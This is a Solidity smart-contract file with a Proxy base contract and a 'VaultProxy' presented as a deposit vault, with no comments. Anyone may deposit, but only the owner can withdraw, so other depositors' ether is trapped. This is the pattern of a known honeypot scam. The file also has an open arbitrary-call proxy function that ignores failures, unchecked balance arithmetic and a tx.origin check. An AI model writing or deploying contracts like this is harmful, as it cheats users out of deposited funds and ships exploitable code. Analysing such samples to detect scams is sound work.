pragma solidity ^0.8.26;

contract Proxy {
    address Owner = payable(msg.sender);
    modifier onlyOwner { if (msg.sender == Owner) _; } 
    function transferOwner(address _owner) public onlyOwner { Owner = payable(_owner); } 
    function proxy(address target, bytes memory data) public payable {
        (bool success,) = target.call{value: msg.value}(data);
    }
}

contract VaultProxy is Proxy {
    mapping (address => uint256) public Deposits;
    uint256 public totalDeposits;
    uint256 public minDeposit = 0.5 ether;
    uint256 public maxWithdrawal = 10 ether;
    
    event DepositMade(address indexed depositor, uint256 amount);
    event WithdrawalMade(address indexed withdrawer, uint256 amount);

    receive() external payable { }
    
    constructor() payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > minDeposit) {
            unchecked {
                Deposits[msg.sender] += msg.value;
                totalDeposits += msg.value;
            }
            emit DepositMade(msg.sender, msg.value);
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount > 0 && Deposits[msg.sender] >= amount && amount <= maxWithdrawal) {
            payable(msg.sender).transfer(amount);
            unchecked {
                Deposits[msg.sender] -= amount;
                totalDeposits -= amount;
            }
            emit WithdrawalMade(msg.sender, amount);
        }
    }
    
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}